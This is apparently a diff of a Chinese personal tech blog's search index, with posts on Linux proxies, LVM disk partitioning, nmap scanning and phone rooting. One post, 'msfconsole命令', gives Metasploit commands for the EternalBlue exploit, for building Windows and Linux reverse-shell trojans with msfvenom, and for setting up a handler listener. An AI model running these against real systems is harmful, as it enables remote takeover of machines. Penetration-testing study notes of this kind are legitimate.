-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="永久">永久</h3>
-<p>通过修改profile文件实现：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br></pre></td></tr></table></figure>
-<p>末尾添加以下内容</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export http_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export https_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export ftp_proxy=&quot;http://proxy_ip:port&quot;</span><br><span class="line">export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;</span><br></pre></td></tr></table></figure>
-<p>执行生效命令即可</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>
-<h2 id="kali">kali</h2>
-<p>使用proxychains4代理，与上述类似，安装：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install proxychains4</span><br></pre></td></tr></table></figure>
-<p>修改末尾的代理服务器端口即可</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
-<p>使用方法是命令前加上proxychains4即可</p>
-]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>kali</tag>
-        <tag>网络代理</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux下载离线安装包</title>
     <url>/2025/01/13/linux%E4%B8%8B%E8%BD%BD%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85%E5%8C%85/</url>
     <content><![CDATA[<h2 id="centos">centos</h2>
@@ -2354,6 +2354,70 @@ yum install --downloadonly --downloaddir=/root wget</p>
       </categories>
       <tags>
         <tag>linux命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux硬盘分区挂载和扩容</title>
+    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
+    <content><![CDATA[<h2 id="分区和挂载">分区和挂载</h2>
+<h3 id="非逻辑分区和挂载">非逻辑分区和挂载</h3>
+<h4 id="先将空闲磁盘通过fdisk分区">先将空闲磁盘通过fdisk分区</h4>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>
+<p>帮助</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
+<h4 id="挂载">挂载</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="逻辑卷及挂载">逻辑卷及挂载</h3>
+<p>首先和上步一样，使用fdisk创建一个分区/dev/sdb1</p>
+<h4 id="创建物理卷（PV）">创建物理卷（PV）</h4>
+<p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate /dev/sdb{1,2,3,4,5}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>
+<h4 id="创建卷组（VG）">创建卷组（VG）</h4>
+<p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>
+<h4 id="创建逻辑卷（LV）">创建逻辑卷（LV）</h4>
+<p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
+<h4 id="挂载-2">挂载</h4>
+<p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="分区扩容">分区扩容</h2>
+<h3 id="非逻辑分区">非逻辑分区</h3>
+<p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
+<h4 id="已分区扩容">已分区扩容</h4>
+<p>以/dev/sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
+<h4 id="未分区扩容">未分区扩容</h4>
+<p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="逻辑分区">逻辑分区</h3>
+<p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
+<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
+<p>让文件系统占满 LV 的全部 18 GB</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo resize2fs /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以用<code>lvdisplay</code>查看名称</p>
+</blockquote>
+<hr>
+<h2 id="删除分区操作">删除分区操作</h2>
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="开机自动挂载">开机自动挂载</h2>
+<p>通过df -h查看文件系统名称，然后修改/etc/fstab最后一行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>系统运维</category>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>硬盘分区</tag>
+        <tag>分区扩容</tag>
       </tags>
   </entry>
   <entry>
@@ -2796,70 +2860,6 @@ yum install --downloadonly --downloaddir=/root wget</p>
       </tags>
   </entry>
   <entry>
-    <title>linux硬盘分区挂载和扩容</title>
-    <url>/2025/01/15/linux%E6%89%A9%E5%AE%B9%E7%A1%AC%E7%9B%98/</url>
-    <content><![CDATA[<h2 id="分区和挂载">分区和挂载</h2>
-<h3 id="非逻辑分区和挂载">非逻辑分区和挂载</h3>
-<h4 id="先将空闲磁盘通过fdisk分区">先将空闲磁盘通过fdisk分区</h4>
-<p>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdb </span><br><span class="line">依次选择	n/p/n/回车默认/+size&#123;K,M,G&#125;</span><br></pre></td></tr></table></figure>
-<p>帮助</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">分区操作类</span><br><span class="line">a：切换分区的启动标志。当需要设置某个分区为可启动分区时使用，比如在多系统安装时指定引导系统所在的分区。</span><br><span class="line">d：删除一个分区。当分区不再需要或需要重新划分磁盘空间时，可用来删除现有分区，但此操作会丢失该分区上的数据。</span><br><span class="line">n：添加一个新的分区。可用于在磁盘上创建新的存储空间区域，需指定分区类型（主分区、扩展分区或逻辑分区等）、起始扇区和结束扇区等信息。</span><br><span class="line">t：改变分区的系统标识（系统ID）。不同的系统ID代表不同的文件系统类型或分区用途，如 Linux、Windows、交换分区等，通过修改系统ID可让操作系统正确识别分区类型。</span><br><span class="line"></span><br><span class="line">分区表操作类</span><br><span class="line">g：创建一个新的空的 GPT（GUID Partition Table）分区表。GPT 是一种较新的分区表格式，支持大于 2TB 的分区，适用于大容量磁盘。</span><br><span class="line">G：创建一个 IRIX（SGI）分区表。IRIX 是一种 Unix 操作系统，该命令用于创建适用于该系统的特殊分区表。</span><br><span class="line">o：创建一个新的空的 DOS 分区表。DOS 分区表是传统的分区表格式，广泛应用于早期的 Windows 系统等，最多支持 4 个主分区或 3 个主分区加 1 个扩展分区。</span><br><span class="line"></span><br><span class="line">显示与验证类</span><br><span class="line">l：列出已知的分区类型。可帮助用户了解各种系统ID对应的分区类型，以便在修改分区系统ID时进行参考。</span><br><span class="line">p：打印分区表。显示磁盘上当前的分区信息，包括分区编号、起始扇区、结束扇区、分区大小、系统ID等，方便用户查看磁盘分区布局。</span><br><span class="line">v：验证分区表。检查分区表的完整性和正确性，如分区是否有重叠、分区表格式是否正确等，确保磁盘分区结构的稳定性。</span><br><span class="line"></span><br><span class="line">其他操作类</span><br><span class="line">b：编辑 BSD disklabel。BSD 是一种 Unix 类操作系统，该命令用于编辑其特有的磁盘标签，进行更细致的分区管理。</span><br><span class="line">c：切换 DOS 兼容性标志。在某些情况下，可能需要调整分区表的兼容性设置，以确保在不同系统或工具下能正确识别磁盘分区。</span><br><span class="line">q：退出而不保存更改。当用户在操作过程中发现错误或不想修改分区信息时，可选择此命令退出工具，之前所做的更改不会被写入磁盘。</span><br><span class="line">s：创建一个新的空的 Sun disklabel。Sun 是一种 Unix 工作站，该命令用于创建其特有的磁盘标签。</span><br><span class="line">u：改变显示/输入单位。可切换单位如扇区、KB、MB、GB 等，方便用户根据需要更直观地查看和设置分区大小等信息。</span><br><span class="line">w：将分区表写入磁盘并退出。当完成所有分区操作且确认无误后，使用此命令将更改保存到磁盘，使新的分区布局生效。</span><br><span class="line">x：额外功能（仅限专家使用）。包含一些高级的、不常用的分区操作选项，普通用户一般不建议使用，除非对分区操作非常熟悉。</span><br></pre></td></tr></table></figure>
-<h4 id="挂载">挂载</h4>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化</span><br><span class="line">mkfs.ext4 /dev/sdb1</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/mydisk</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/sdb1 /mnt/mydisk</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/mydisk</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="逻辑卷及挂载">逻辑卷及挂载</h3>
-<p>首先和上步一样，使用fdisk创建一个分区/dev/sdb1</p>
-<h4 id="创建物理卷（PV）">创建物理卷（PV）</h4>
-<p>将新创建的分区转化成物理卷，主要是添加LVM属性信息并划分PE存储单元，多个一起设置 pvcreate /dev/sdb{1,2,3,4,5}</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb1</span><br><span class="line">pvs</span><br></pre></td></tr></table></figure>
-<h4 id="创建卷组（VG）">创建卷组（VG）</h4>
-<p>创建卷组vgtest ,并将刚才创建好的物理卷加入该卷组.默认PE大小为4MB,PE是卷组的最小存储单元.可以通过 –s参数修改大小。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vgcreate vgtest /dev/sdb1</span><br><span class="line">vgs</span><br></pre></td></tr></table></figure>
-<h4 id="创建逻辑卷（LV）">创建逻辑卷（LV）</h4>
-<p>创建逻辑卷，将卷组vgtest上面分割4G给新的逻辑卷lvtest1，将卷组vgtest上剩余空间分配给新的逻辑卷lvtest2</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvcreate -L 4G -n lvtest01 vgtest</span><br><span class="line">lvcreate -l 100%FREE -n lvtest02 vgtest</span><br><span class="line">lvs</span><br></pre></td></tr></table></figure>
-<h4 id="挂载-2">挂载</h4>
-<p>和非逻辑分区挂载方式一样，先格式化再挂载目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先格式化(文件系统)</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest01</span><br><span class="line">mkfs.ext4 /dev/vgtest/lvtest02</span><br><span class="line">2、创建文件夹</span><br><span class="line">mkdir /mnt/test</span><br><span class="line">3、挂载</span><br><span class="line">mount /dev/vgtest/lvtest01 /mnt/test</span><br><span class="line">取消挂载</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="分区扩容">分区扩容</h2>
-<h3 id="非逻辑分区">非逻辑分区</h3>
-<p>两种情况，一种是已经分区的扩容然后盘还有空间扩容，一种是未分区使用整个磁盘的需要扩容。第二种其实算是第一种的后半部分。</p>
-<h4 id="已分区扩容">已分区扩容</h4>
-<p>以/dev/sdb1为例子，使用了5G大小，盘总共10G，sdb1需要扩容为10G。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、解除挂载</span><br><span class="line">umount /mnt/test</span><br><span class="line">2、调整分区大小</span><br><span class="line">parted /dev/sdb</span><br><span class="line">resizepart 1（回车然后输入大小，可以是%，也可以直接指定大小，需要加上单位）</span><br><span class="line">quit</span><br><span class="line">3、重新识别大小</span><br><span class="line">resize2fs /dev/sdb1</span><br><span class="line">4、重新挂载即可</span><br><span class="line">umount /mnt/test</span><br></pre></td></tr></table></figure>
-<h4 id="未分区扩容">未分区扩容</h4>
-<p>使用整个磁盘大小，在原基础磁盘上扩容磁盘后调整，相当于不需要重新调整分区大小，直接重新识别即可，一般在虚拟环境</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/sdb1</span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="逻辑分区">逻辑分区</h3>
-<p>总体是将新物理卷扩容到卷组，然后将卷组空间分配给已有逻辑卷中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sdb2</span><br><span class="line">vgextend vgtest /dev/sdb2</span><br><span class="line">lvextend -l +100%FREE  /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
-<p>最后重新挂载即可，可以将-l改成-L指定磁盘大小</p>
-<p>让文件系统占满 LV 的全部 18 GB</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo resize2fs /dev/mapper/vgtest-lvtest01</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>可以用<code>lvdisplay</code>查看名称</p>
-</blockquote>
-<hr>
-<h2 id="删除分区操作">删除分区操作</h2>
-<p>命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lvremove /dev/vgtest/lvtest01</span><br><span class="line">vgremove  vgtest</span><br><span class="line">pvremove /dev/sdb1</span><br></pre></td></tr></table></figure>
-<hr>
-<h2 id="开机自动挂载">开机自动挂载</h2>
-<p>通过df -h查看文件系统名称，然后修改/etc/fstab最后一行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/mapper/vgtest-lvtest01     /mnt/test        ext4    defaults        0 0</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>系统运维</category>
-        <category>linux</category>
-      </categories>
-      <tags>
-        <tag>硬盘分区</tag>
-        <tag>分区扩容</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>linux服务管理入门</title>
     <url>/2025/06/24/linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h2 id="基本操作">基本操作</h2>
@@ -2908,72 +2908,6 @@ yum install --downloadonly --downloaddir=/root wget</p>
         <tag>系统运维</tag>
         <tag>linux</tag>
         <tag>linux服务</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>msfconsole命令</title>
-    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="攻击模块">攻击模块</h2>
-<p>软件更新</p>
-<pre><code>apt update # 更新安装包信息；只检查，不更新
-apt upgrade # 更新已安装的软件包，不删除旧包； 
-apt full-upgrade # 升级包，删除旧包
-</code></pre>
-<p>基础使用</p>
-<pre><code>msfconsole //进入框架
-search  ms17_010 //使用search命令查找相关漏洞
-use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
-info //使用info查看模块信息
-show options //查看参数
-set  RHOST  192.168.100.158 //设置参数
-exploit/run
-</code></pre>
-<p>辅助模块(auxiliary)</p>
-<p>漏洞利用(exploit)</p>
-<p>攻击载荷(payload)：<br>
-Stager中几种常见的payload：<br>
-windows/meterpreter/bind_tcp       //正向连接<br>
-windows/meterpreter/reverse_tcp    //反向连接，常用<br>
-windows/meterpreter/reverse_http   //通过监听80端口反向连接<br>
-windows/meterpreter/reverse_https  //通过监听443端口反向连接</p>
-<h2 id="木马">木马</h2>
-<p>windows木马<br>
-创建木马</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
-</code></pre>
-<p>开启kali监听</p>
-<pre><code>启动msfconsole
-开启监听
-	use exploit/multi/handler
-设置tcp监听
-	set payload windows/meterpreter/reverse_tcp
-设置本机ip和端口
-	set
-输入explore开始监听
-</code></pre>
-<p>运行木马后木马上线，进入meterpreter</p>
-<p>后续同上，不做详细解释</p>
-<p>linux elf木马反弹shell创建（msf6版本）</p>
-<pre><code>	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
-</code></pre>
-<p>监听</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload linux/x64/meterpreter/reverse_tcp
-set lhost xxx.xxx.xxx.xxx
-set lport 8888
-run
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-        <category>命令</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>渗透命令</tag>
       </tags>
   </entry>
   <entry>
@@ -3167,28 +3101,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>oppoA9 mtk手机root</title>
-    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
-    <content><![CDATA[<h2 id="mtk手机root">mtk手机root</h2>
-<p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
-<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
-<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
-</code></pre>
-<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量±键，插入数据线，等待软件连接<br>
-2、连接后通过读分区导出boot文件，不带后缀<br>
-3、手机开机安装magisk，通过面具修补boot文件，boot文件改回bin后缀</p>
-<p><img src="/images/pasted-2.png" alt="upload successful"></p>
-<p>4、同样通过第一步连接手机，刷入修补好的boot文件，重新启动发现无需按电源键即可开机，代表已成功root。</p>
-<p><img src="/images/pasted-3.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>手机搞机</category>
-      </categories>
-      <tags>
-        <tag>手机root</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>nginx和apache-简单配置</title>
     <url>/2025/06/23/nginx%E5%92%8Capache/</url>
     <content><![CDATA[<h2 id="Apache-配置">Apache 配置</h2>
@@ -3295,118 +3207,59 @@ run
       </tags>
   </entry>
   <entry>
-    <title>nmap命令</title>
-    <url>/2024/08/01/nmap%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="常用命令总结">常用命令总结</h2>
-<p>命令格式</p>
-<pre><code>nmap [参数] [ip]
+    <title>msfconsole命令</title>
+    <url>/2024/08/01/msfconsole%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="攻击模块">攻击模块</h2>
+<p>软件更新</p>
+<pre><code>apt update # 更新安装包信息；只检查，不更新
+apt upgrade # 更新已安装的软件包，不删除旧包； 
+apt full-upgrade # 升级包，删除旧包
 </code></pre>
-<p>主机探测（隐蔽扫描/TCP ACK/TCP SYN/TCP空扫描欺骗防火墙）</p>
-<pre><code>nmap -sS/-PS/-PA/-sN ip
+<p>基础使用</p>
+<pre><code>msfconsole //进入框架
+search  ms17_010 //使用search命令查找相关漏洞
+use exploit/windows/smb/ms17_010_eternalblue //使用use进入模块
+info //使用info查看模块信息
+show options //查看参数
+set  RHOST  192.168.100.158 //设置参数
+exploit/run
 </code></pre>
-<p>命令表格</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">命令</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">nmap IP</td>
-<td style="text-align:center">扫描IP</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -v IP</td>
-<td style="text-align:center">加强扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap IP1 IP2 …</td>
-<td style="text-align:center">扫描多IP</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap a.b.c.*</td>
-<td style="text-align:center">扫描整个子网</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap a.b.c.x,y,…</td>
-<td style="text-align:center">扫描多子网地址</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -iL xxx.txt</td>
-<td style="text-align:center">根据文件扫描多IP</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap a.b.c.x-y</td>
-<td style="text-align:center">扫描子网IP范围</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap a.b.c.* --exclude IP</td>
-<td style="text-align:center">排除指定IP扫描整个子网</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -A IP</td>
-<td style="text-align:center">扫描操作系统和路由跟踪</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -O IP</td>
-<td style="text-align:center">探测操作系统</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sA/-PN IP</td>
-<td style="text-align:center">探测防火墙</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sP a.b.c.*</td>
-<td style="text-align:center">探测在线主机</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -F IP</td>
-<td style="text-align:center">快速扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -r IP</td>
-<td style="text-align:center">按顺序扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -iflist</td>
-<td style="text-align:center">显示接口和路由信息</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -p n1,n2… IP</td>
-<td style="text-align:center">扫描指定端口</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -p T:n1,n2… IP</td>
-<td style="text-align:center">扫描TCP端口</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sU n1,n2… IP</td>
-<td style="text-align:center">扫描UDP端口</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sV IP</td>
-<td style="text-align:center">查看服务的版本</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -PS IP</td>
-<td style="text-align:center">TCP ACK扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -PA IP</td>
-<td style="text-align:center">TCP SYN扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sS IP</td>
-<td style="text-align:center">隐蔽扫描</td>
-</tr>
-<tr>
-<td style="text-align:center">nmap -sN IP</td>
-<td style="text-align:center">TCP空扫描欺骗防火墙</td>
-</tr>
-</tbody>
-</table>
+<p>辅助模块(auxiliary)</p>
+<p>漏洞利用(exploit)</p>
+<p>攻击载荷(payload)：<br>
+Stager中几种常见的payload：<br>
+windows/meterpreter/bind_tcp       //正向连接<br>
+windows/meterpreter/reverse_tcp    //反向连接，常用<br>
+windows/meterpreter/reverse_http   //通过监听80端口反向连接<br>
+windows/meterpreter/reverse_https  //通过监听443端口反向连接</p>
+<h2 id="木马">木马</h2>
+<p>windows木马<br>
+创建木马</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o 123.exe
+</code></pre>
+<p>开启kali监听</p>
+<pre><code>启动msfconsole
+开启监听
+	use exploit/multi/handler
+设置tcp监听
+	set payload windows/meterpreter/reverse_tcp
+设置本机ip和端口
+	set
+输入explore开始监听
+</code></pre>
+<p>运行木马后木马上线，进入meterpreter</p>
+<p>后续同上，不做详细解释</p>
+<p>linux elf木马反弹shell创建（msf6版本）</p>
+<pre><code>	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=8888 -f elf &gt; mshell.elf
+</code></pre>
+<p>监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost xxx.xxx.xxx.xxx
+set lport 8888
+run
+</code></pre>
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -3417,6 +3270,28 @@ run
         <tag>网络安全</tag>
         <tag>kali</tag>
         <tag>渗透命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>oppoA9 mtk手机root</title>
+    <url>/2024/08/01/mtk%E6%89%8B%E6%9C%BAroot/</url>
+    <content><![CDATA[<h2 id="mtk手机root">mtk手机root</h2>
+<p>通过mtkclient工具连接手机漏洞后，导出boot文件，修补后导回，完成root。</p>
+<p>mkclient下载地址，可通过下方网友地址，或者github上获取：</p>
+<pre><code>https://xinkid.lanzouv.com/b075nltgh 密:canxin
+</code></pre>
+<p>1、oppoA9为例，打开mtkclient工具，手机关机后按住音量±键，插入数据线，等待软件连接<br>
+2、连接后通过读分区导出boot文件，不带后缀<br>
